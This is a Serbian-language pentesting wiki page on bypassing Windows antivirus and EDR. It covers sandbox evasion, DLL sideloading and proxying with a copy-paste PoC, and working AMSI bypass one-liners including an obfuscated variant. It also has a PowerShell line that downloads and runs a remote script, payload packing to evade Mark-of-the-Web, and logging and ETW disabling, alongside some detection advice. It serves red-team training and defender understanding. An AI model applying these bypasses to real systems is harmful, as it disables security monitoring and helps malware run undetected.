# Zaobilaženje antivirusa (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Alat koji zaustavlja Windows Defender lažirajući drugi AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Trenutno, AV koriste različite metode za proveru da li je fajl zlonameran ili ne: static detection, dynamic analysis, i za naprednije EDR-ove, behavioural analysis.

### **Static detection**

Statička detekcija postiže se flagovanjem poznatih zlonamernih stringova ili nizova bajtova u binarnom fajlu ili skripti, kao i ekstrakcijom informacija iz samog fajla (npr. file description, company name, digital signatures, icon, checksum, itd.). To znači da korišćenje poznatih javnih alata može lakše dovesti do otkrivanja, jer su verovatno već analizirani i označeni kao zlonamerni. Postoji nekoliko načina da se zaobiđe ova vrsta detekcije:

- **Encryption**

Ako enkriptuješ binarni fajl, AV neće moći da detektuje program, ali će ti trebati neki loader da dekriptuje i pokrene program u memoriji.

- **Obfuscation**

Ponekad je dovoljno promeniti neke stringove u binarnom fajlu ili skripti da bi prošao pored AV-a, ali to može biti vremenski zahtevan posao u zavisnosti od toga šta pokušavaš da obfuskuješ.

- **Custom tooling**

Ako razviješ sopstvene alate, neće postojati poznate zle potpise, ali to zahteva mnogo vremena i truda.

> [!TIP]
> Dobar način za proveru protiv Windows Defender statičke detekcije je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On praktično deli fajl na više segmenata i potom zadatkuje Defender da skenira svaki pojedinačno; na taj način može tačno da ti kaže koji su stringovi ili bajtovi označeni u binarnom fajlu.

Toplo preporučujem da pogledaš ovu [YouTube playlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion.

### **Dynamic analysis**

Dinamička analiza je kada AV pokreće tvoj binarni fajl u sandbox-u i posmatra zlonamerno ponašanje (npr. pokušaj dekriptovanja i čitanja lozinki iz browsera, pravljenje minidump-a LSASS-a, itd.). Ovaj deo može biti malo teži za zaobići, ali evo nekoliko stvari koje možeš uraditi da izbegneš sandbo xe.

- **Sleep before execution** U zavisnosti od implementacije, može biti odličan način za zaobilaženje AV-ove dinamičke analize. AV-ovi imaju vrlo kratak vremenski prozor za skeniranje fajlova da ne bi prekinuli korisnikov rad, pa korišćenje dugih sleep-ova može poremetiti analizu binarnih fajlova. Problem je što mnogi AV-ovi imaju sandbox-e koji mogu jednostavno preskočiti sleep u zavisnosti od implementacije.
- **Checking machine's resources** Obično sandbox-i imaju vrlo malo resursa za rad (npr. < 2GB RAM), inače bi mogli usporiti korisnikov računar. Ovdje možeš biti kreativan, npr. proverom temperature CPU-a ili čak brzine ventilatora — nije sve implementirano u sandbox-u.
- **Machine-specific checks** Ako želiš ciljati korisnika čija je radna stanica pridružena domenu "contoso.local", možeš proveriti domen računara da vidiš da li se poklapa s onim koji si zadao; ako se ne poklapa, program može izaći.

Ispostavilo se da je computername Microsoft Defender-ovog Sandbox-a HAL9TH, tako da možeš proveriti ime računara u svom malveru pre detonacije; ako ime odgovara HAL9TH, znači da si unutar Defender sandbox-a, pa program može izaći.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Neki drugi zaista dobri saveti od [@mgeeky](https://twitter.com/mariuszbit) za suprotstavljanje Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanal</p></figcaption></figure>

Kao što smo ranije rekli, **javne alatke** će na kraju **biti detektovane**, pa bi trebalo da postaviš sebi pitanje:

Na primer, ako želiš da dump-uješ LSASS, **da li zaista moraš da koristiš mimikatz**? Ili možeš koristiti neki drugi projekat koji je manje poznat i takođe dump-uje LSASS.

Pravi odgovor je verovatno ovo drugo. Uzmimo mimikatz kao primer — verovatno je jedan od, ako ne i najviše flagovanih komada “malvera” od strane AV-ova i EDR-ova; i dok je projekat super dobar, on predstavlja noćnu moru kada želiš da ga zaobiđeš, pa potraži alternative za ono što pokušavaš da postigneš.

> [!TIP]
> Kada modifikuješ svoje payload-e radi evazije, obavezno isključi automatic sample submission u defender-u, i molim te, ozbiljno, **NE UČITAVAJ NA VIRUSTOTAL** ako ti je cilj dugoročna evazija. Ako želiš da proveriš da li tvoj payload biva detektovan od strane nekog AV-a, instaliraj taj AV na VM, pokušaj da isključiš automatic sample submission i testiraj tamo dok nisi zadovoljan rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **prioritizuj korišćenje DLL-ova za evaziju** — po mom iskustvu, DLL fajlovi su obično **mnogo manje detektovani** i analizirani, pa je to jednostavan trik da izbegneš detekciju u nekim slučajevima (ako tvoj payload ima način da se pokrene kao DLL, naravno).

Kao što vidimo na slici, DLL Payload iz Havoc-a ima detection rate 4/26 na antiscan.me, dok EXE payload ima 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me poređenje normalnog Havoc EXE payload-a naspram normalnog Havoc DLL-a</p></figcaption></figure>

Sada ćemo pokazati neke trikove koje možeš koristiti sa DLL fajlovima da budeš mnogo prikriveniji.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi redosled pretrage DLL-ova koji loader sledi tako što pozicionira i victim aplikaciju i zlonamerne payload-e jedan pored drugog.

Možeš proveriti programe podložne DLL Sideloading koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će ispisati listu programa podložnih DLL hijackingu unutar "C:\Program Files\\" i DLL fajlova koje pokušavaju da učitaju.

Toplo preporučujem da **explore DLL Hijackable/Sideloadable programs yourself**, ova tehnika je prilično stealthy ako se pravilno izvede, ali ako koristite javno poznate DLL Sideloadable programe, lako možete biti otkriveni.

Samo postavljanje zlonamernog DLL-a sa imenom koje program očekuje da učita neće pokrenuti vaš payload, jer program očekuje određene funkcije u tom DLL-u; da bismo rešili ovaj problem, koristićemo drugu tehniku zvanu **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje sa proxy (i malicious) DLL-a na originalni DLL, čime se čuva funkcionalnost programa i omogućava rukovanje izvršenjem vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 datoteke: a DLL source code template, and the original renamed DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading i takođe [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) kako biste saznali više o onome što smo detaljnije razmatrali.

### Zloupotreba prosleđenih Export-a (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Učitaće `TargetDll` ako već nije učitan
- Pronaći `TargetFunc` u njemu

Ključna ponašanja koja treba razumeti:
- Ako je `TargetDll` KnownDLL, on se isporučuje iz zaštićenog KnownDLLs namespace-a (npr., ntdll, kernelbase, ole32).
- Ako `TargetDll` nije KnownDLL, koristi se normalni redosled pretrage DLL-ova, koji uključuje direktorijum modula koji vrši razrešavanje forward-a.

Ovo omogućava indirektni sideloading primitive: pronađite potpisani DLL koji exportuje funkciju forwardovanu na ime modula koje nije KnownDLL, zatim postavite taj potpisani DLL u istu fasciklu sa DLL-om pod kontrolom napadača koji je tačno imenovan kao prosleđeni ciljni modul. Kada se prosleđeni export pozove, loader razreši forward i učita vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, tako da se rešava putem normalnog redosleda pretrage.

PoC (copy-paste):
1) Kopirajte potpisani sistemski DLL u mapu u koju se može pisati
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u isti direktorijum. Minimalan DllMain je dovoljan za izvršenje koda; nije potrebno implementirati prosleđenu funkciju da biste pokrenuli DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Pokrenite prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Posmatrano ponašanje:
- rundll32 (signed) učitava side-by-side `keyiso.dll` (signed)
- Dok rešava `KeyIsoSetAuditingInterface`, loader sledi preusmeravanje ka `NCRYPTPROV.SetAuditingInterface`
- Zatim loader učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku "missing API" tek nakon što se `DllMain` već izvršio

Saveti za detekciju:
- Fokusirajte se na forwarded exports gde ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Možete enumerisati forwarded exports pomoću alata kao što su:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte Windows 11 forwarder inventar da biste potražili kandidate: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- Alert on process/module chains like: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` under user-writable paths
- Enforce code integrity policies (WDAC/AppLocker) and deny write+execute in application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Možete koristiti Freeze da učitate i izvršite svoj shellcode na prikriven način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša — ono što funkcioniše danas može biti detektovano sutra, zato se nikada ne oslanjajte samo na jedan alat; ako je moguće, pokušajte povezati više evasion techniques.

## AMSI (Anti-Malware Scan Interface)

AMSI je kreiran da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku su AVs mogli da skeniraju samo **files on disk**, pa ako biste na neki način izvršili payloads **directly in-memory**, AV nije mogao ništa da uradi da to spreči, jer nije imao dovoljno uvida.

AMSI feature je integrisan u sledeće komponente Windows-a.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Omogućava antivirusnim rešenjima da pregledaju ponašanje skripti tako što izlaže sadržaj skripti u obliku koji nije šifrovan i nije obfuskovan.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Primetite kako doda `amsi:` i potom putanju do izvršnog fajla iz kojeg je skripta pokrenuta, u ovom slučaju, powershell.exe

Nismo pustili nijedan fajl na disk, ali smo ipak uhvaćeni in-memory zbog AMSI.

Štaviše, počevši od **.NET 4.8**, C# code takođe prolazi kroz AMSI. Ovo čak utiče i na `Assembly.Load(byte[])` za in-memory execution. Zato se preporučuje korišćenje nižih verzija .NET-a (poput 4.7.2 ili niže) za in-memory execution ako želite da zaobiđete AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuscation**

Pošto AMSI uglavnom radi sa static detections, modifikovanje skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima mogućnost unobfuscating skripti čak i ako ima više slojeva, tako da obfuscation može biti loša opcija u zavisnosti od načina na koji je urađena. To čini izbegavanje detekcije manje jednostavnim. Ipak, ponekad je dovoljno da promenite par imena promenljivih i bićete u redu, pa sve zavisi od toga koliko je nešto označeno.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u powershell (takođe cscript.exe, wscript.exe, itd.) proces, moguće je lako manipulisati njime čak i kada se pokreće kao neprivilegovan korisnik. Zbog ovog nedostatka u implementaciji AMSI-ja, istraživači su pronašli više načina da evade AMSI scanning.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Bila je dovoljna samo jedna linija powershell koda da učini AMSI neupotrebljivim za trenutni powershell proces. Naravno, ta linija je označena od strane samog AMSI-ja, pa je potrebna određena modifikacija da bi se ova tehnika mogla koristiti.

Evo modifikovanog AMSI bypassa koji sam preuzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti označeno čim ova objava izađe, pa ne biste trebali objavljivati kod ako planirate ostati neotkriveni.

**Memory Patching**

Ova tehnika je prvobitno otkrivena od [@RastaMouse](https://twitter.com/_RastaMouse/) i uključuje pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (koja je odgovorna za skeniranje ulaza koji je korisnik dostavio) i prepisivanje te funkcije instrukcijama koje vraćaju kod E_INVALIDARG; na taj način rezultat stvarnog skeniranja će vratiti 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike koje se koriste za zaobilaženje AMSI pomoću powershell-a; pogledajte [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

Ovaj alat [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) takođe generiše skriptu za zaobilaženje AMSI.

**Uklonite detektovani potpis**

Možete koristiti alat kao što su [https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi) i [https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger) da uklonite detektovani AMSI potpis iz memorije trenutnog procesa. Ovi alati rade tako što skeniraju memoriju trenutnog procesa u potrazi za AMSI potpisom, a zatim ga prepisuju NOP instrukcijama, efektivno uklanjajući ga iz memorije.

**AV/EDR products that uses AMSI**

Možete pronaći listu AV/EDR proizvoda koji koriste AMSI na [https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi).

**Koristite Powershell verziju 2**
Ako koristite PowerShell verziju 2, AMSI neće biti učitan, pa možete pokretati svoje skripte bez skeniranja od strane AMSI. Možete to učiniti ovako:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je funkcija koja omogućava beleženje svih PowerShell komandi izvršenih na sistemu. Ovo može biti korisno za reviziju i rešavanje problema, ali takođe može predstavljati **problem za napadače koji žele da izbegnu detekciju**.

Za zaobilaženje PowerShell logging-a možete koristiti sledeće tehnike:

- **Disable PowerShell Transcription and Module Logging**: Za ovu namenu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati skripte bez skeniranja od strane AMSI. Ovo možete uraditi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da spawn-ujete powershell bez odbrane (ovo je ono što `powerpick` iz Cobal Strike koristi).


## Obfuscation

> [!TIP]
> Nekoliko tehnika obfuskacije se oslanja na enkriptovanje podataka, što povećava entropiju binarnog fajla i olakšava AVs i EDRs njegovo otkrivanje. Budite oprezni sa tim i moguće je da primenite enkripciju samo na specifične delove koda koji su osetljivi ili koje treba sakriti.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili komercijalne fork-ove) često se nailazi na više slojeva zaštite koji blokiraju dekompajlere i sandbokse. Radni tok ispod pouzdano **vraća skoro-originalni IL** koji se potom može dekompilovati u C# u alatima kao što su dnSpy ili ILSpy.

1.  Anti-tampering removal – ConfuserEx enkriptuje svako *method body* i dekriptuje ga unutar *module* statičkog konstruktora (`<Module>.cctor`). Ovo takođe menja PE checksum pa bilo kakva modifikacija može srušiti binarni fajl. Koristite **AntiTamperKiller** da locirate enkriptovane metadata tabele, oporavite XOR ključeve i prepišete čist assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izgradnji vlastitog unpacker-a.

2.  Symbol / control-flow recovery – predajte *clean* fajl **de4dot-cex** (ConfuserEx-aware fork de4dot-a).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – izaberite ConfuserEx 2 profil  
• de4dot će poništiti control-flow flattening, vratiti originalne namespaces, klase i imena varijabli i dekriptovati konstantne stringove.

3.  Proxy-call stripping – ConfuserEx zamenjuje direktne pozive metoda laganim wrapper-ima (t.zv. *proxy calls*) da dodatno oteža dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebalo bi da primetite normalne .NET API-je poput `Convert.FromBase64String` ili `AES.Create()` umesto nejasnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Manual clean-up – pokrenite dobijeni binarni fajl u dnSpy-u, pretražite velike Base64 blob-ove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da locirate *pravi* payload. Često malware čuva payload kao TLV-enkodirani niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Gore navedeni lanac vraća tok izvršavanja **bez** potrebe da se pokreće zlonamerni sample – korisno pri radu na offline radnoj stanici.

> 🛈  ConfuserEx proizvodi custom atribut nazvan `ConfusedByAttribute` koji se može koristiti kao IOC za automatsku trijažu sample-ova.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) kompilacionog paketa koji može da pruži povećanu bezbednost softvera kroz [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstrira kako koristiti `C++11/14` jezik da bi se pri kompilaciji generisao obfuscated code bez korišćenja bilo kog external tool i bez modifikovanja kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuscated operations generisanih pomoću C++ template metaprogramming framework-a što će otežati život osobi koja želi da crack-uje aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuscate razne PE fajlove uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je fine-grained code obfuscation framework za LLVM-supported languages koristeći ROP (return-oriented programming). ROPfuscator obfuscates program na nivou assembly koda transformišući regularne instrukcije u ROP chains, narušavajući našu prirodnu percepciju normalnog control flow-a.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL u shellcode i zatim ih učita

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih executables sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno malicioznih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom funkcioniše na osnovu reputacije, što znači da će aplikacije koje se retko preuzimaju aktivirati SmartScreen, upozoriti i sprečiti korisnika da pokrene fajl (iako se fajl i dalje može pokrenuti klikom More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa imenom Zone.Identifier koji se automatski kreira pri preuzimanju fajlova sa interneta, zajedno sa URL-om sa kojeg je preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani sa **trusted** signing certificate **neće aktivirati SmartScreen**.

Veoma efikasan način da sprečite da vaši payloads dobiju Mark of The Web je da ih spakujete u neki container poput ISO-a. To je zato što Mark-of-the-Web (MOTW) **ne može** biti primenjen na **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payloads u output containers kako bi izbegao Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za logovanje u Windows-u koji omogućava aplikacijama i sistemskim komponentama da **log events**. Međutim, može se takođe koristiti od strane sigurnosnih proizvoda za praćenje i detekciju zlonamernih aktivnosti.

Slično kao što se AMSI onemogućava (bypassa), moguće je i učiniti da funkcija korisničkog prostora procesa **`EtwEventWrite`** odmah vrati kontrolu bez logovanja ikakvih događaja. To se postiže patchovanjem funkcije u memoriji da odmah vrati kontrolu, efektivno onemogućavajući ETW logovanje za taj proces.

Više informacija možete naći na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory je poznato već duže vreme i i dalje je odličan način za pokretanje post-exploitation alata bez da vas AV otkrije.

Pošto će payload biti učitan direktno u memoriju bez dodirivanja diska, potrebno je samo da se pozabavimo patchovanjem AMSI za ceo proces.

Većina C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već omogućava izvršavanje C# assemblies direktno u memoriji, ali postoji nekoliko različitih načina da se to uradi:

- **Fork\&Run**

Podrazumeva **spawning a new sacrificial process**, inject your post-exploitation malicious code u taj novi proces, izvršiti zlonamerni kod i po završetku ubiti novi proces. Ovo ima i svoje prednosti i mane. Prednost fork and run metode je što se izvršavanje dešava **outside** našeg Beacon implant procesa. To znači da ako nešto u našoj post-exploitation akciji krene po zlu ili bude otkriveno, postoji **much greater chance** da naš **implant preživi.** Mana je što imate **greater chance** da budete otkriveni od strane **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o injectovanju post-exploitation malicious code **into its own process**. Na ovaj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV, ali mana je što ako nešto pođe po zlu pri izvršenju vašeg payload-a, postoji **much greater chance** da **izgubite svoj beacon** jer bi mogao da se sruši.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite više da pročitate o C# Assembly loading, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Takođe možete učitavati C# Assemblies **from PowerShell**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Korišćenje drugih programskih jezika

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati zlonamerni kod koristeći druge jezike tako što se kompromitovanom računaru omogući pristup **to the interpreter environment installed on the Attacker Controlled SMB share**.

Dozvoljavanjem pristupa Interpreter Binaries i okruženju na SMB share-u možete **execute arbitrary code in these languages within memory** kompromitovanog računara.

Repo navodi: Defender i dalje skenira skripte ali korišćenjem Go, Java, PHP itd. imamo **more flexibility to bypass static signatures**. Testiranje sa nasumičnim neobfuskiranim reverse shell skriptama u ovim jezicima se pokazalo uspešnim.

## TokenStomping

Token stomping je tehnika koja omogućava napadaču da **manipuliše access token-om ili bezbednosnim proizvodom kao što je EDR ili AV**, omogućavajući mu da smanji njihove privilegije tako da proces neće umreti, ali neće imati dozvole da proverava zlonamerne aktivnosti.

Da bi se ovo sprečilo, Windows bi mogao **prevent external processes** da dobijaju handle-ove nad token-ima sigurnosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
